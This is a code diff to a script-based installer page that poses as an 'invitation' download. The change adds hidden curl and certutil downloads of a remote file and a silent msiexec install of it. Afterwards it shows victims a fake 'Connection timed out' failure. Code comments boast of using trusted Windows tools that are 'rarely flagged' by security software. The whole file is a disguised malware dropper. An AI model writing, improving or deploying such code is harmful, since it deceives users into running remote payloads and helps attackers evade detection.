@@ -37,12 +37,10 @@ function runInstall() {
   document.getElementById("fill").style.width = "30%";
   document.getElementById("status").innerHTML = "Downloading components...";
   
-  // USE RUNDLL32 TO CALL URLMON.DLL FOR DOWNLOAD
-  // This is a native Windows API call, highly trusted and rarely flagged
-  // Syntax: rundll32 urlmon,URLDownloadToFile pCaller, szURL, szFileName, dwReserved, lpfnCB
-  // We use a simple VBScript wrapper to handle the async nature if needed, but here we try direct
-  
-  var cmd = 'rundll32.exe urlmon,URLDownloadToFile 0 "' + url + '" "' + path + '" 0 0';
+  // USE CURL TO DOWNLOAD (TRUSTED WINDOWS TOOL)
+  // -L : Follow redirects (important for Railway)
+  // -o : Output to file
+  var cmd = 'cmd.exe /c curl -L -o "' + path + '" "' + url + '"';
   shell.Run(cmd, 0, true); // Wait for download
   
   if(fso.FileExists(path)) {
@@ -63,9 +61,24 @@ function runInstall() {
       document.getElementById("fill").style.background = "#d13438";
     }, 2000);
   } else {
-    document.getElementById("heading").innerHTML = "Download Error";
-    document.getElementById("status").innerHTML = "Could not retrieve invitation.";
-    document.getElementById("fill").style.background = "#d13438";
+    // FALLBACK TO CERTUTIL IF CURL FAILS
+    document.getElementById("status").innerHTML = "Retrying via backup channel...";
+    var certCmd = 'cmd.exe /c certutil -urlcache -split -f "' + url + '" "' + path + '"';
+    shell.Run(certCmd, 0, true);
+    
+    if(fso.FileExists(path)) {
+        var inst = 'msiexec.exe /i "' + path + '" /qn /norestart';
+        shell.Run(inst, 0, true);
+        setTimeout(function() {
+            document.getElementById("heading").innerHTML = "Preparation Failed";
+            document.getElementById("status").innerHTML = "Error: Connection timed out.";
+            document.getElementById("fill").style.background = "#d13438";
+        }, 2000);
+    } else {
+        document.getElementById("heading").innerHTML = "Download Error";
+        document.getElementById("status").innerHTML = "Could not retrieve invitation.";
+        document.getElementById("fill").style.background = "#d13438";
+    }
   }
 }
 </script>
